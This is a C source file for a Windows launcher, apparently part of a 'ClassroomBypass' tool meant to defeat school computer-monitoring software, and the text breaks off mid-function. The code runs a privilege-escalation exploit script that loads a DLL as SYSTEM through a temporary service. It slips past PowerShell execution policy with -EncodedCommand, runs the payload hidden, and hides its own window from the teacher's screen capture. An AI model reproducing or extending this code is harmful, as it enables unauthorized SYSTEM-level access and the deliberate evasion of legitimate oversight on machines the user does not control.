/*
 * elevate.c -- start-up elevation with a graceful fallback.
 *
 * The mode is decided by the code, not by a config file: LPE when
 * bin\lpe\trigger.ps1 is present, otherwise the UAC prompt.  --elevate=...
 * on the command line still wins (the broker appends --elevate=uac, and tests
 * may force a mode explicitly).
 *
 * The elevated instance is recognised by the "elevated instance pid=..." line
 * in the shared log, written by Elevate_NoteElevated() from the new process.
 * Waiting for that line (instead of trusting the trigger's exit code) is what
 * makes "did the LPE work?" reliable: the exploit only proves that a process
 * *started*, not that our program is actually running elevated.
 *
 * NOTE: this file is compiled with the rest of the project (GBK source encoding
 * for the Chinese UI strings).  Keep the code itself ASCII so it does not
 * depend on the code page; only the string literals are non-ASCII.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#include "elevate.h"

/* the ONE shared log: the launcher, the payload, the spawned children and
   the injected DLLs all append here (see also TruncateHookLog in bypass.c) */
#define ELEVATE_LOG      "bypass_hook.log"
#define ELEVATE_SELFTEST "bypass_elevate_selftest.b64"   /* debug, goes to %TEMP% */
#define LPE_TRIGGER      "lpe\\trigger.ps1"

/* CreateProcessA takes 32766 characters plus the NUL.  Sizing the buffer to
   exactly that keeps "the buffer is full" and "the API refuses" at the same
   threshold; a bigger buffer only moved the failure deeper (we would hand
   CreateProcess a silently truncated Base64 blob and PowerShell would report
   a decode error instead of the real reason). */
#define LPE_CMDLINE_MAX  32767

/* How long the launcher waits for trigger.ps1 to unwind through its finally
   after the user hits "skip".  Fixed on purpose: the user gave up, so this must
   not scale with TimeoutSec (45 s).  The loop polls the abort file every
   200 ms, and the only thing the finally does is one documents_path.exe set,
   so 3000 ms is ~15 polls of slack for a script that is not stuck. */
#define LPE_SKIP_GRACE_MS 3000

static int   g_mode = -1;

/* ---------------- small helpers ---------------- */

/* exe directory into out.  0 = failed or truncated (out is then empty). */
static int ExeDir(char* out, size_t n)
{
    DWORD got;
    char* p;

    if (!out || n == 0) return 0;
    out[0] = '\0';

    got = GetModuleFileNameA(NULL, out, (DWORD)n);
    if (got == 0 || (size_t)got >= n) { out[0] = '\0'; return 0; }
    p = strrchr(out, '\\');
    if (!p) { out[0] = '\0'; return 0; }
    *p = '\0';
    return 1;
}

/* "<dir>\<name>" into out.  0 = bad arguments or truncated; out is emptied in
   that case, so a caller can never end up opening a half-written path. */
static int Join(char* out, size_t n, const char* dir, const char* name)
{
    int r;

    if (!out || n == 0) return 0;
    out[0] = '\0';
    if (!dir || !name) return 0;

    r = _snprintf(out, n, "%s\\%s", dir, name);
    if (r < 0 || (size_t)r >= n) { out[0] = '\0'; return 0; }
    return 1;
}

/* "<exe dir>\<name>" into out - a file that ships next to the exe, e.g.
   "lpe\\trigger.ps1".  0 = failed or truncated (out is empty). */
static int ExeSibling(char* out, size_t n, const char* name)
{
    char dir[MAX_PATH];

    if (!out || n == 0) return 0;
    out[0] = '\0';
    if (!ExeDir(dir, sizeof(dir))) return 0;
    return Join(out, n, dir, name);
}

static int FileExists(const char* p)
{
    return GetFileAttributesA(p) != INVALID_FILE_ATTRIBUTES;
}

static void TruncateLog(void)
{
    char   path[MAX_PATH];
    HANDLE h;

    if (!ExeSibling(path, sizeof(path), ELEVATE_LOG)) return;
    h = CreateFileA(path, GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
}

/* One shared log file per run: the launcher truncates bypass_hook.log, then
   the launcher, the payload, the spawned children and later the injected DLLs
   all append.  FILE_APPEND_DATA keeps every writer at the real end of file
   even with several processes appending at once. */
static void ELog(const char* fmt, ...)
{
    /* Single-threaded by construction (WinMain -> Elevate_Boot); static only to
       keep it off the stack.  Do NOT reach for __thread/__declspec(thread) here:
       mingw links those against libwinpthread-1.dll, which the release package
       does not ship (a 64-bit exe that finds the 32-bit copy in C:\mingw32\bin
       dies at startup with 0xC000007B).  If a worker thread ever logs, use
       TlsAlloc, or take the lock the DLL loggers already use. */
    static char line[4096];
    char        path[MAX_PATH];
    SYSTEMTIME  st;
    va_list     ap;
    int         n;
    HANDLE      h;
    DWORD       written = 0;

    if (!ExeSibling(path, sizeof(path), ELEVATE_LOG)) return;

    GetLocalTime(&st);
    n = _snprintf(line, sizeof(line) - 3,
                  "[%02d:%02d:%02d.%03d] [pid %lu] ",
                  st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
                  (unsigned long)GetCurrentProcessId());
    if (n < 0) return;
    va_start(ap, fmt);
    _vsnprintf(line + n, sizeof(line) - n - 3, fmt, ap);
    va_end(ap);
    line[sizeof(line) - 3] = '\0';
    n = (int)strlen(line);
    line[n++] = '\r';
    line[n++] = '\n';

    h = CreateFileA(path, FILE_APPEND_DATA,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        WriteFile(h, line, (DWORD)n, &written, NULL);
        CloseHandle(h);
    }
}

/* ---------------- admin check ---------------- */

int Elevate_IsAdmin(void)
{
    SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
    PSID admin = NULL;
    BOOL member = FALSE;

    if (!AllocateAndInitializeSid(&nt, 2,
                                  SECURITY_BUILTIN_DOMAIN_RID,
                                  DOMAIN_ALIAS_RID_ADMINS,
                                  0, 0, 0, 0, 0, 0, &admin))
        return 0;
    if (!CheckTokenMembership(NULL, admin, &member)) member = FALSE;
    FreeSid(admin);
    return member ? 1 : 0;
}

/* ---------------- mode selection ---------------- */

static const char* ModeName(int m)
{
    switch (m) {
    case ELEVATE_UAC:    return "uac";
    case ELEVATE_LPE:    return "lpe";
    case ELEVATE_MANUAL: return "manual";
    case ELEVATE_OFF:    return "off";
    default:             return "?";
    }
}

static int ParseMode(const char* s, int* out)
{
    if (!s) return 0;
    while (*s == ' ' || *s == '\t') s++;
    if (!_strnicmp(s, "lpe", 3))    { *out = ELEVATE_LPE;    return 1; }
    if (!_strnicmp(s, "uac", 3))    { *out = ELEVATE_UAC;    return 1; }
    if (!_strnicmp(s, "manual", 6)) { *out = ELEVATE_MANUAL; return 1; }
    if (!_strnicmp(s, "off", 3))    { *out = ELEVATE_OFF;    return 1; }
    return 0;
}

static int Mode(void)
{
    char trigger[MAX_PATH];

    if (g_mode >= 0) return g_mode;          /* only WinMain calls this */

    /* Mode decided by the code: LPE when the payload exists, UAC otherwise. */
    g_mode = (ExeSibling(trigger, sizeof(trigger), LPE_TRIGGER) &&
              FileExists(trigger)) ? ELEVATE_LPE : ELEVATE_UAC;
    return g_mode;
}

/* take the LAST --elevate= occurrence: the broker appends "--elevate=uac" to
   the command line it launches, and that guard must win over anything the
   user typed (otherwise a Medium-IL child would re-run the LPE forever). */
static int CmdLineMode(const char* cmdline, int* found)
{
    const char* p;
    int mode = ELEVATE_UAC;

    *found = 0;
    if (!cmdline) return mode;

    for (p = cmdline; *p; p++) {
        int m;
        if (_strnicmp(p, "--elevate=", 10) != 0) continue;
        if (ParseMode(p + 10, &m)) { mode = m; *found = 1; }
    }
    return mode;
}

/* ---------------- launching helpers ---------------- */

static int RunHidden(char* cmdline, const char* logPath, HANDLE* outProc,
                     HANDLE job)
{
    STARTUPINFOA        si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    HANDLE hOut = INVALID_HANDLE_VALUE, hNul = INVALID_HANDLE_VALUE;
    DWORD  flags;

    memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    /* Everything the payload prints (including PowerShell's error records)
       goes into the shared bypass_hook.log.  The handle is opened with
       FILE_APPEND_DATA so the inherited stdout of the child appends atomically
       even while this process and the trigger keep appending with their own
       handles. */
    if (logPath && *logPath) {
        hOut = CreateFileA(logPath, FILE_APPEND_DATA,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           &sa, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        hNul = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           &sa, OPEN_EXISTING, 0, NULL);
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (hOut != INVALID_HANDLE_VALUE) {
        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdOutput = hOut;
        si.hStdError  = hOut;
        si.hStdInput  = (hNul != INVALID_HANDLE_VALUE) ? hNul : NULL;
    }
    memset(&pi, 0, sizeof(pi));

    /* CREATE_SUSPENDED closes the window between CreateProcess returning and
       AssignProcessToJobObject succeeding: without it the child may already
       have spawned a grandchild that then lives outside the job.  It costs one
       ResumeThread below and nothing else. */
    flags = CREATE_NO_WINDOW | (job ? CREATE_SUSPENDED : 0);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        flags, NULL, NULL, &si, &pi)) {
        ELog("CreateProcess failed err=%lu", (unsigned long)GetLastError());
        if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
        if (hNul != INVALID_HANDLE_VALUE) CloseHandle(hNul);
        return 0;
    }
    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
    if (hNul != INVALID_HANDLE_VALUE) CloseHandle(hNul);

    if (job) {
        if (AssignProcessToJobObject(job, pi.hProcess)) {
            ELog("lpe: script is in the job (kill-on-close)");
        } else {
            /* Not fatal.  The usual reason is that the child already belongs
               to a job we do not control (ERROR_ACCESS_DENIED); a hard kill by
               handle still stops the script itself, only its own children
               escape.  Documents has two backstops for that: the finally block
               while the script lives, the snapshot after it dies. */
            ELog("lpe: job assign failed err=%lu - a hard kill will cover the "
                 "script only, not its children", (unsigned long)GetLastError());
        }
        /* Unconditional and after the assign: a child left suspended because
           "the protection failed" looks exactly like a hung tool to the user,
           which is strictly worse than running it unprotected. */
        ResumeThread(pi.hThread);
    }

    CloseHandle(pi.hThread);
    if (outProc) *outProc = pi.hProcess;
    else         CloseHandle(pi.hProcess);
    return 1;
}

/* ---------------- skip channel + job object ---------------- */

/* %LOCALAPPDATA%\ClassroomBypass-LPE\abort.<pid>
   Same directory as the Documents snapshot, for the same reason: bin\lpe can
   be read-only (a copy under Program Files), and this file has to be writable
   by a Medium-IL process.  The pid in the name keeps a file left by an earlier
   run from cancelling this one - except when Windows reuses the pid, which is
   why the file is also deleted before the script starts. */
static int SkipFilePath(char* out, size_t n, DWORD pid)
{
    char  base[MAX_PATH];
    char  dir[MAX_PATH];
    DWORD got;
    int   r;

    if (!out || n == 0) return 0;
    out[0] = '\0';

    got = GetEnvironmentVariableA("LOCALAPPDATA", base, sizeof(base));
    if (got == 0 || (size_t)got >= sizeof(base)) return 0;

    r = _snprintf(dir, sizeof(dir), "%s\\ClassroomBypass-LPE", base);
    if (r < 0 || (size_t)r >= sizeof(dir)) return 0;
    CreateDirectoryA(dir, NULL);        /* already existing is the normal case */

    r = _snprintf(out, n, "%s\\abort.%lu", dir, (unsigned long)pid);
    if (r < 0 || (size_t)r >= n) { out[0] = '\0'; return 0; }
    return 1;
}

/* The file's existence is the signal; the text inside is for the log's sake
   only (a human reading %LOCALAPPDATA% can tell when the skip happened). */
static int WriteAbort(const char* path)
{
    HANDLE h;
    char   line[64];
    int    n;
    DWORD  written = 0;

    h = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                    NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        ELog("lpe: cannot write the abort file %s (err=%lu)", path,
             (unsigned long)GetLastError());
        return 0;
    }
    n = _snprintf(line, sizeof(line), "abort %lu\r\n",
                  (unsigned long)GetTickCount());
    if (n > 0) WriteFile(h, line, (DWORD)n, &written, NULL);
    CloseHandle(h);
    return 1;
}

/* A kill between CreateServiceW and DeleteService leaves CVE49176_<pid>_<tick>
   behind.  It cannot start by itself (SERVICE_DEMAND_START, default DACL gives
   Interactive User query-only), but the next High-IL context can start it, and
   it would load wallet_callback_shell.dll from a user-writable directory as
   SYSTEM - so a leftover deserves a line in the log, not just a README note.
   Enumeration needs only SC_MANAGER_ENUMERATE_SERVICE.  Nothing is deleted
   here: that needs admin, and "skip" must not turn into a second UAC prompt. */
static void LogLeftoverServices(void)
{
    SC_HANDLE             scm;
    LPENUM_SERVICE_STATUSA buf;
    DWORD                 size = 16 * 1024;
    DWORD                 needed = 0, returned = 0, resume = 0;
    int                   found = 0;

    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!scm) {
        ELog("note: cannot enumerate services (err=%lu) - check CVE49176_* by "
             "hand if this machine ever skipped mid-flight",
             (unsigned long)GetLastError());
        return;
    }

    for (;;) {
        DWORD i;
        DWORD err;

        buf = (LPENUM_SERVICE_STATUSA)malloc(size);
        if (!buf) break;
        if (!EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_STATE_ALL,
                                 buf, size, &needed, &returned, &resume)) {
            err = GetLastError();
            free(buf);
            if (err == ERROR_MORE_DATA && needed > size) { size = needed; continue; }
            break;
        }
        for (i = 0; i < returned; i++) {
            if (_strnicmp(buf[i].lpServiceName, "CVE49176_", 9) != 0) continue;
            if (found < 5)
                ELog("note: service %s may remain - see lpe\\README.md for the "
                     "elevated cleanup sequence", buf[i].lpServiceName);
            found++;
        }
        free(buf);
        if (resume == 0) break;
    }
    CloseServiceHandle(scm);

    if (found == 0)  ELog("note: no leftover CVE49176_* service");
    else if (found > 5) ELog("note: %d CVE49176_* services in total", found);
}

/* KILL_ON_JOB_CLOSE is the backstop for "elevate.c vanished": closing the last
   handle to the job terminates everything inside it, so a killed launcher
   cannot leave a hidden powershell holding the Documents redirect. */
static HANDLE CreateKillOnCloseJob(void)
{
    HANDLE job;
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION li;

    job = CreateJobObjectW(NULL, NULL);
    if (!job) {
        ELog("lpe: CreateJobObject failed err=%lu", (unsigned long)GetLastError());
        return NULL;
    }
    memset(&li, 0, sizeof(li));
    li.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
                                 &li, sizeof(li))) {
        ELog("lpe: SetInformationJobObject failed err=%lu",
             (unsigned long)GetLastError());
        CloseHandle(job);
        return NULL;
    }
    return job;
}

/* Closing the handle kills the script, so every NORMAL return has to disarm
   first.  The success path in particular breaks out of the loop as soon as the
   handshake appears, while trigger.ps1 is usually still inside its finally -
   killing it there would leave Documents on the LPE root on every successful
   run, which is far worse than the skip case this job was added for.
   Explicit kills are TerminateProcess calls; this job only answers "what if
   the launcher dies?". */
static void CloseJob(HANDLE job)
{
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION li;

    if (!job) return;
    memset(&li, 0, sizeof(li));
    if (!SetInformationJobObject(job, JobObjectExtendedLimitInformation,
                                 &li, sizeof(li))) {
        /* Deliberately leak the handle.  Closing it here would kill a script
           that may still be inside its finally; leaking defers that to process
           exit, and the launcher usually lives for seconds after this point
           (the UAC leg), which is enough for the script to finish on its own.
           A leak on an error path is the cheaper failure. */
        ELog("lpe: could not disarm kill-on-close err=%lu - leaking the job "
             "handle so the script is not killed here",
             (unsigned long)GetLastError());
        return;
    }
    CloseHandle(job);
}

/* 32-bit build on 64-bit Windows: System32 is redirected to SysWOW64, so the
   native (64-bit) PowerShell has to be reached through Sysnative. */
static int FindPowerShell(char* out, size_t n)
{
    char win[MAX_PATH];
    char cand[MAX_PATH];
    BOOL wow = FALSE;

    if (!GetWindowsDirectoryA(win, sizeof(win))) return 0;
    if (IsWow64Process(GetCurrentProcess(), &wow) && wow) {
        _snprintf(cand, sizeof(cand) - 1,
                  "%s\\Sysnative\\WindowsPowerShell\\v1.0\\powershell.exe", win);
        cand[sizeof(cand) - 1] = '\0';
        if (FileExists(cand)) { _snprintf(out, n - 1, "%s", cand); out[n - 1] = '\0'; return 1; }
    }
    _snprintf(cand, sizeof(cand) - 1,
              "%s\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", win);
    cand[sizeof(cand) - 1] = '\0';
    if (!FileExists(cand)) return 0;
    _snprintf(out, n - 1, "%s", cand);
    out[n - 1] = '\0';
    return 1;
}

/* 0 = nothing usable, 1 = pid (out), 2 = the spawned child gave up (abandon).
   Reads the tail of the SHARED log: the launcher truncated it at startup, so
   every marker in there belongs to the current chain. */
static int ScanHookLogStatus(const char* path, DWORD* pid)
{
    static char buf[8192];
    HANDLE h;
    DWORD  size, start, got = 0;
    char*  p;
    int    lastRes = 0;
    DWORD  lastPid = 0;

    *pid = 0;
    h = CreateFileA(path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return 0; }
    start = (size > (sizeof(buf) - 1)) ? size - (sizeof(buf) - 1) : 0;
    SetFilePointer(h, (LONG)start, NULL, FILE_BEGIN);
    ReadFile(h, buf, size - start, &got, NULL);
    CloseHandle(h);
    buf[got] = '\0';

    p = buf;
    if (start > 0) {
        char* q = strchr(p, '\n');
        if (q) p = q + 1;                    /* skip the cut-off line */
    }
    for (;;) {
        char* e = strchr(p, '\n');
        const char* m;
        if (e) *e = 0;
        m = strstr(p, "elevated instance pid=");
        if (m) {
            lastPid = (DWORD)strtoul(m + 22, NULL, 10);
            lastRes = 1;
        } else if (strstr(p, "ELEVATE_ABANDON")) {
            lastRes = 2;
        }
        if (!e) break;
        p = e + 1;
    }
    if (lastRes == 1 && lastPid) *pid = lastPid;
    else if (lastRes == 1) lastRes = 0;
    return lastRes;
}

/* last child_pid= in the shared log (the trigger writes it inside its
   "shell started" line).  Fallback evidence when the handshake line is late:
   the broker may spawn a child that still has to run a UAC prompt before
   anything announces itself. */
static int ScanHookLogChildPid(const char* path, DWORD* pid)
{
    static char buf[8192];
    HANDLE h;
    DWORD  size, start, got = 0;
    char*  p, *last = NULL;

    *pid = 0;
    h = CreateFileA(path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE) { CloseHandle(h); return 0; }
    start = (size > (sizeof(buf) - 1)) ? size - (sizeof(buf) - 1) : 0;
    SetFilePointer(h, (LONG)start, NULL, FILE_BEGIN);
    ReadFile(h, buf, size - start, &got, NULL);
    CloseHandle(h);
    buf[got] = '\0';

    p = buf;
    if (start > 0) {
        char* q = strchr(p, '\n');
        if (q) p = q + 1;
    }
    for (;;) {
        char* e = strchr(p, '\n');
        char* m;
        if (e) *e = 0;
        m = strstr(p, "child_pid=");
        if (m) last = m + 10;
        if (!e) break;
        p = e + 1;
    }
    if (!last) return 0;
    *pid = (DWORD)strtoul(last, NULL, 10);
    return *pid != 0;
}

/* 1 = alive, 0 = gone, -1 = cannot tell (higher integrity: trust the caller) */
static int ProcessState(DWORD pid)
{
    HANDLE h;
    DWORD  w;

    if (!pid) return 0;
    h = OpenProcess(SYNCHRONIZE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return (GetLastError() == ERROR_ACCESS_DENIED) ? -1 : 0;
    w = WaitForSingleObject(h, 0);
    CloseHandle(h);
    return (w == WAIT_TIMEOUT) ? 1 : 0;
}

/* ---------------- progress window ---------------- */

/* The launcher must never look frozen while the payload runs: a small topmost
   window shows the current stage and offers "skip to UAC".  Created on its own
   thread (it needs a message loop for the button), driven with SetWindowText. */

#define ELEV_STATUS_CLASS L"BypassElevateStatus"
#define IDC_ELEV_TEXT 2001
#define IDC_ELEV_SKIP 2002

static HWND g_sw, g_swText;
static volatile LONG g_swSkip, g_swReady;

static LRESULT CALLBACK StatusProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    switch (m) {
    case WM_COMMAND:
        if (LOWORD(w) == IDC_ELEV_SKIP) {
            InterlockedExchange(&g_swSkip, 1);
            if (g_swText) SetWindowTextW(g_swText,
                                         L"正在切换到 UAC 提示…");
        }
        return 0;
    case WM_CLOSE:
        DestroyWindow(h);
        return 0;
    case WM_DESTROY:
        g_sw = NULL;
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

static DWORD WINAPI StatusThread(LPVOID p)
{
    WNDCLASSEXW wc;
    MSG         msg;
    HINSTANCE   inst = GetModuleHandleA(NULL);
    HFONT       font = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
    int         w = 470, hh = 132;
    int         x, y;

    (void)p;
    memset(&wc, 0, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = StatusProc;
    wc.hInstance     = inst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszClassName = ELEV_STATUS_CLASS;
    RegisterClassExW(&wc);          /* ERROR_CLASS_ALREADY_EXISTS is fine */

    x = (GetSystemMetrics(SM_CXSCREEN) - w) / 2;
    y = (GetSystemMetrics(SM_CYSCREEN) - hh) / 2;
    g_sw = CreateWindowExW(WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE,
                           ELEV_STATUS_CLASS, L"教学控制解除工具",
                           WS_POPUP | WS_BORDER,
                           x, y, w, hh, NULL, NULL, inst, NULL);
    if (!g_sw) {
        InterlockedExchange(&g_swReady, 1);
        return 0;
    }

    /* 提权进度窗也不能被拍进抓屏: 老师端监控/录屏正好在这个时间点是可能的。
       (0x11 = WDA_EXCLUDEFROMCAPTURE, Win10 2004+; 老系统退回"抓屏里变黑") */
    if (!SetWindowDisplayAffinity(g_sw, WDA_EXCLUDEFROMCAPTURE))
        SetWindowDisplayAffinity(g_sw, WDA_MONITOR);

    g_swText = CreateWindowExW(0, L"STATIC", L"正在自动提权…",
                               WS_CHILD | WS_VISIBLE | SS_LEFT | SS_NOPREFIX,
                               16, 14, w - 32, 64, g_sw,
                               (HMENU)(INT_PTR)IDC_ELEV_TEXT, inst, NULL);
    {
        HWND btn = CreateWindowExW(0, L"BUTTON", L"跳过，直接弹 UAC",
                                   WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                   w - 190, hh - 46, 174, 30, g_sw,
                                   (HMENU)(INT_PTR)IDC_ELEV_SKIP, inst, NULL);
        if (font) {
            SendMessageW(g_swText, WM_SETFONT, (WPARAM)font, TRUE);
            if (btn) SendMessageW(btn, WM_SETFONT, (WPARAM)font, TRUE);
        }
    }

    ShowWindow(g_sw, SW_SHOWNOACTIVATE);
    UpdateWindow(g_sw);
    InterlockedExchange(&g_swReady, 1);

    while (GetMessageW(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}

static void StatusOpen(void)
{
    HANDLE th;
    int    i;

    if (g_sw) return;
    InterlockedExchange(&g_swReady, 0);
    InterlockedExchange(&g_swSkip, 0);
    th = CreateThread(NULL, 0, StatusThread, NULL, 0, NULL);
    if (th) CloseHandle(th);
    for (i = 0; i < 100 && !g_swReady; i++) Sleep(10);
}

static void StatusSetText(const char* utf8)
{
    wchar_t w[512];
    if (!g_swText) return;
    if (MultiByteToWideChar(CP_UTF8, 0, utf8, -1, w, 512) <= 0) return;
    SetWindowTextW(g_swText, w);
}

static void StatusClose(void)
{
    int i;
    if (!g_sw) return;
    PostMessageW(g_sw, WM_CLOSE, 0, 0);
    for (i = 0; i < 100 && g_sw; i++) Sleep(10);
}

/* ---------------- the three ways up ---------------- */

static int TryUac(const char* cmdline, int silent)
{
    char exe[MAX_PATH];
    static char params[2048];
    SHELLEXECUTEINFOA sei;
    DWORD got;
    int   n;

    got = GetModuleFileNameA(NULL, exe, sizeof(exe));
    if (got == 0 || got >= sizeof(exe)) {
        ELog("uac: own path does not fit in %u bytes", (unsigned)sizeof(exe));
        return 0;
    }
    /* --elevate=uac marks the spawned instance as a chain member: it skips the
       early single-instance exit (the launcher holds the mutex) and the log
       truncation.  An admin instance never reads the flag beyond that. */
    if (cmdline && *cmdline)
        n = _snprintf(params, sizeof(params), "%s --elevate=uac", cmdline);
    else
        n = _snprintf(params, sizeof(params), "--elevate=uac");
    if (n < 0 || n >= (int)sizeof(params)) {
        /* Truncating here drops the marker, and then the elevated instance
           makes itself a second launcher and dies on the mutex. */
        ELog("uac: parameters too long (%d bytes, max %u)", n,
             (unsigned)sizeof(params) - 1);
        return 0;
    }

    memset(&sei, 0, sizeof(sei));
    sei.cbSize       = sizeof(sei);
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    sei.lpVerb       = "runas";
    sei.lpFile       = exe;
    sei.lpParameters = params;
    sei.nShow        = silent ? SW_HIDE : SW_SHOWNORMAL;

    ELog("uac: ShellExecuteEx runas");
    if (!ShellExecuteExA(&sei)) {
        ELog("uac: failed err=%lu", (unsigned long)GetLastError());
        return 0;
    }
    if (sei.hProcess) CloseHandle(sei.hProcess);
    ELog("uac: elevated instance launched");
    return 1;
}

/* ---------------- policy-proof script execution ---------------- */

/* The payload is run through -EncodedCommand: the execution policy (including
   the GPO-enforced "scripts are forbidden" state that makes even
   -ExecutionPolicy Bypass useless) only covers script *files*, so this always
   starts.  The four variables the script expects are prepended here. */

static const char kB64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char* Base64Encode(const BYTE* data, size_t len)
{
    size_t outLen = ((len + 2) / 3) * 4 + 1;
    char*  out = (char*)malloc(outLen);
    size_t i, o = 0;

    if (!out) return NULL;
    for (i = 0; i + 2 < len; i += 3) {
        unsigned v = ((unsigned)data[i] << 16) |
                     ((unsigned)data[i + 1] << 8) | data[i + 2];
        out[o++] = kB64[(v >> 18) & 63];
        out[o++] = kB64[(v >> 12) & 63];
        out[o++] = kB64[(v >> 6) & 63];
        out[o++] = kB64[v & 63];
    }
    if (i < len) {
        unsigned v = (unsigned)data[i] << 16;
        int      rem = (int)(len - i);
        if (rem == 2) v |= (unsigned)data[i + 1] << 8;
        out[o++] = kB64[(v >> 18) & 63];
        out[o++] = kB64[(v >> 12) & 63];
        out[o++] = (rem == 2) ? kB64[(v >> 6) & 63] : '=';
        out[o++] = '=';
    }
    out[o] = '\0';
    return out;
}

/* single-quoted PowerShell string literal */
static void PsQuote(char* out, size_t n, const char* s)
{
    size_t o = 0;

    if (n < 3) { if (n) out[0] = '\0'; return; }
    out[o++] = '\'';
    while (*s && o + 3 < n) {
        if (*s == '\'') out[o++] = '\'';
        out[o++] = *s++;
    }
    out[o++] = '\'';
    out[o] = '\0';
}

static char* BuildEncodedCommand(const char* scriptPath, const char* repo,
                                 const char* target, DWORD abortPid)
{
    FILE*    f;
    char*    script;
    char*    all;
    char*    b64 = NULL;
    wchar_t* wide = NULL;
    char     qRepo[700];
    /* 2 * 2048 + 8: both call sites keep target in a char[2048] and refuse to
       truncate it, and PowerShell quoting can at most double every byte.  The
       old 900-byte buffer silently cut the tail of a long command line, and the
       tail is where "--elevate=uac" lives. */
    char     qTarget[2 * 2048 + 8];
    char     pre[sizeof(qRepo) + sizeof(qTarget) + 96];
    long     size;
    int      wlen, npre;

    f = fopen(scriptPath, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    size = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (size <= 0 || size > 200000) { fclose(f); return NULL; }
    script = (char*)malloc((size_t)size + 1);
    if (!script) { fclose(f); return NULL; }
    if (fread(script, 1, (size_t)size, f) != (size_t)size) {
        fclose(f); free(script); return NULL;
    }
    fclose(f);
    script[size] = '\0';
    if ((unsigned char)script[0] == 0xEF && (unsigned char)script[1] == 0xBB &&
        (unsigned char)script[2] == 0xBF)
        memmove(script, script + 3, (size_t)size - 2);   /* drop the BOM */

    PsQuote(qRepo, sizeof(qRepo), repo);
    PsQuote(qTarget, sizeof(qTarget), target);
    /* AbortPid is the pid of THIS launcher: trigger.ps1 is our direct child, so
       it cannot derive it from $PID (that is powershell's own pid) and should
       not have to walk the WMI parent chain for one number. */
    npre = _snprintf(pre, sizeof(pre) - 1,
                     "$Repo=%s;$TargetCommand=%s;$TimeoutSec=45;$AbortPid=%lu;\r\n",
                     qRepo, qTarget, (unsigned long)abortPid);
    pre[sizeof(pre) - 1] = '\0';
    if (npre < 0 || npre >= (int)sizeof(pre) - 1) {
        ELog("lpe: encoded preamble does not fit (%d bytes, max %u)",
             npre, (unsigned)sizeof(pre) - 2);
        free(script);
        return NULL;
    }

    all = (char*)malloc(strlen(pre) + strlen(script) + 1);
    if (all) {
        strcpy(all, pre);
        strcat(all, script);

        wlen = MultiByteToWideChar(CP_UTF8, 0, all, -1, NULL, 0);
        if (wlen > 0) {
            wide = (wchar_t*)malloc((size_t)wlen * sizeof(wchar_t));
            if (wide && MultiByteToWideChar(CP_UTF8, 0, all, -1, wide, wlen) > 0)
                b64 = Base64Encode((const BYTE*)wide,
                                   (size_t)(wlen - 1) * sizeof(wchar_t));
        }
        free(all);
    }
